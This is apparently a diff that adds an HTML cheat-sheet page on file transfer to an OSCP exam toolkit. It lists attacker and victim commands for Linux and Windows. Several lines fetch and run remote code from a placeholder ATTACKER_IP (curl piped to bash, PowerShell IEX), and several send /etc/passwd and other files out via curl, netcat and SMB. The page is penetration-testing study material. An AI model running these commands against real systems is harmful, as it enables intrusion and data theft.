@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Transfer - OSCP Toolkit</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>📁 File Transfer</h1>
+            <nav>
+                <a href="index.html">Home</a>
+                <a href="quickcmds.html">⚡ Quick Cmds</a>
+                <a href="tools.html">🛠️ Tools</a>
+                <a href="reverse_shells.html">Shells</a>
+                <a href="enumeration.html">Enumeration</a>
+                <a href="privesc_linux.html">Linux PrivEsc</a>
+                <a href="privesc_windows.html">Windows PrivEsc</a>
+                <a href="buffer_overflow.html">Buffer Overflow</a>
+                <a href="transfer_files.html" class="active">File Transfer</a>
+                <a href="pivoting.html">Pivoting</a>
+                <a href="checklist.html">Checklist</a>
+            </nav>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="toc">
+            <h3>📑 Quick Navigation</h3>
+            <ul>
+                <li><a href="#servers">Setup Servers</a></li>
+                <li><a href="#linux-download">Linux Download</a></li>
+                <li><a href="#linux-upload">Linux Upload</a></li>
+                <li><a href="#windows-download">Windows Download</a></li>
+                <li><a href="#windows-upload">Windows Upload</a></li>
+                <li><a href="#smb">SMB Transfer</a></li>
+                <li><a href="#base64">Base64 Method</a></li>
+            </ul>
+        </div>
+
+        <h2 id="servers">🖥️ Setup Servers (Attacker)</h2>
+        <h3>HTTP Server</h3>
+        <pre data-lang="bash"><code><span class="comment"># Python 3</span>
+python3 -m http.server 80
+
+<span class="comment"># Python 2</span>
+python -m SimpleHTTPServer 80
+
+<span class="comment"># PHP</span>
+php -S 0.0.0.0:80</code></pre>
+
+        <h3>SMB Server</h3>
+        <pre data-lang="bash"><code><span class="comment"># Basic</span>
+impacket-smbserver share $(pwd)
+
+<span class="comment"># With SMB2 support (often needed)</span>
+impacket-smbserver share $(pwd) -smb2support
+
+<span class="comment"># With authentication</span>
+impacket-smbserver share $(pwd) -smb2support -user test -password test</code></pre>
+
+        <h3>FTP Server</h3>
+        <pre data-lang="bash"><code>python3 -m pyftpdlib -p 21 -w</code></pre>
+
+        <h3>Netcat Listener</h3>
+        <pre data-lang="bash"><code><span class="comment"># Receive file</span>
+nc -lvnp 4444 > received_file
+
+<span class="comment"># Send file</span>
+nc -lvnp 4444 < file_to_send</code></pre>
+
+        <h2 id="linux-download">🐧 Linux Download Methods</h2>
+        <h3>wget</h3>
+        <pre data-lang="bash"><code>wget http://ATTACKER_IP/file -O /tmp/file
+wget http://ATTACKER_IP/file</code></pre>
+
+        <h3>curl</h3>
+        <pre data-lang="bash"><code>curl http://ATTACKER_IP/file -o /tmp/file
+curl http://ATTACKER_IP/file > /tmp/file
+
+<span class="comment"># Execute directly</span>
+curl http://ATTACKER_IP/script.sh | bash</code></pre>
+
+        <h3>Netcat</h3>
+        <pre data-lang="bash"><code><span class="comment"># On attacker (send)</span>
+nc -lvnp 4444 < file_to_send
+
+<span class="comment"># On victim (receive)</span>
+nc ATTACKER_IP 4444 > received_file</code></pre>
+
+        <h3>/dev/tcp (Bash)</h3>
+        <pre data-lang="bash"><code>cat < /dev/tcp/ATTACKER_IP/PORT > file</code></pre>
+
+        <h3>SCP</h3>
+        <pre data-lang="bash"><code>scp user@ATTACKER_IP:/path/to/file /local/path</code></pre>
+
+        <h2 id="linux-upload">⬆️ Linux Upload Methods</h2>
+        <h3>curl POST</h3>
+        <pre data-lang="bash"><code>curl -X POST -F "file=@/etc/passwd" http://ATTACKER_IP/upload</code></pre>
+
+        <h3>Netcat</h3>
+        <pre data-lang="bash"><code><span class="comment"># On attacker (receive)</span>
+nc -lvnp 4444 > received_file
+
+<span class="comment"># On victim (send)</span>
+nc ATTACKER_IP 4444 < /etc/passwd</code></pre>
+
+        <h2 id="windows-download">🪟 Windows Download Methods</h2>
+        <h3>certutil</h3>
+        <pre data-lang="cmd"><code>certutil.exe -urlcache -split -f http://ATTACKER_IP/file.exe file.exe
+certutil.exe -urlcache -split -f http://ATTACKER_IP/file.exe C:\Windows\Temp\file.exe</code></pre>
+
+        <h3>PowerShell</h3>
+        <pre data-lang="powershell"><code><span class="comment"># Invoke-WebRequest</span>
+Invoke-WebRequest -Uri http://ATTACKER_IP/file.exe -OutFile C:\temp\file.exe
+iwr http://ATTACKER_IP/file.exe -OutFile file.exe
+
+<span class="comment"># WebClient</span>
+(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/file.exe', 'C:\temp\file.exe')
+
+<span class="comment"># Download and execute in memory</span>
+IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/script.ps1')</code></pre>
+
+        <h3>bitsadmin</h3>
+        <pre data-lang="cmd"><code>bitsadmin /transfer job /download /priority high http://ATTACKER_IP/file.exe C:\temp\file.exe</code></pre>
+
+        <h2 id="windows-upload">⬆️ Windows Upload Methods</h2>
+        <h3>PowerShell</h3>
+        <pre data-lang="powershell"><code>$body = Get-Content C:\path\to\file -Raw
+Invoke-WebRequest -Uri http://ATTACKER_IP/upload -Method POST -Body $body</code></pre>
+
+        <h2 id="smb">📂 SMB Transfer</h2>
+        <h3>Setup SMB Server (Attacker)</h3>
+        <pre data-lang="bash"><code>impacket-smbserver share $(pwd) -smb2support</code></pre>
+
+        <h3>Windows Client Commands</h3>
+        <pre data-lang="cmd"><code><span class="comment"># Copy file from SMB</span>
+copy \\ATTACKER_IP\share\file.exe C:\temp\file.exe
+
+<span class="comment"># Copy file to SMB</span>
+copy C:\path\to\file \\ATTACKER_IP\share\file
+
+<span class="comment"># Run directly from share</span>
+\\ATTACKER_IP\share\file.exe
+
+<span class="comment"># Mount share</span>
+net use Z: \\ATTACKER_IP\share
+copy Z:\file.exe C:\temp\</code></pre>
+
+        <h2 id="base64">🔤 Base64 Method</h2>
+        <h3>Linux</h3>
+        <pre data-lang="bash"><code><span class="comment"># On victim - encode</span>
+base64 -w 0 /etc/passwd
+
+<span class="comment"># On attacker - decode</span>
+echo "BASE64_STRING" | base64 -d > passwd</code></pre>
+
+        <h3>Windows</h3>
+        <pre data-lang="powershell"><code><span class="comment"># Encode</span>
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\path\to\file"))
+
+<span class="comment"># Decode</span>
+[IO.File]::WriteAllBytes("C:\output", [Convert]::FromBase64String("BASE64_STRING"))</code></pre>
+
+        <h2>📋 Quick Reference Table</h2>
+        <table>
+            <thead>
+                <tr><th>OS</th><th>Method</th><th>Command</th></tr>
+            </thead>
+            <tbody>
+                <tr><td>Linux</td><td>wget</td><td><code>wget http://IP/file</code></td></tr>
+                <tr><td>Linux</td><td>curl</td><td><code>curl http://IP/file -o file</code></td></tr>
+                <tr><td>Windows</td><td>certutil</td><td><code>certutil -urlcache -f http://IP/file file</code></td></tr>
+                <tr><td>Windows</td><td>PowerShell</td><td><code>iwr http://IP/file -OutFile file</code></td></tr>
+                <tr><td>Windows</td><td>SMB</td><td><code>copy \\IP\share\file .</code></td></tr>
+            </tbody>
+        </table>
+
+        <footer>
+            <p>OSCP Toolkit | Good luck on your exam! 🎯</p>
+        </footer>
+    </div>
+
+    <script>
+        document.querySelectorAll('pre').forEach(pre => {
+            const btn = document.createElement('button');
+            btn.className = 'copy-btn';
+            btn.textContent = 'Copy';
+            btn.onclick = () => {
+                navigator.clipboard.writeText(pre.querySelector('code').textContent);
+                btn.textContent = 'Copied!';
+                btn.classList.add('copied');
+                setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+            };
+            pre.style.position = 'relative';
+            pre.appendChild(btn);
+        });
+    </script>
+</body>
+</html>
+
+
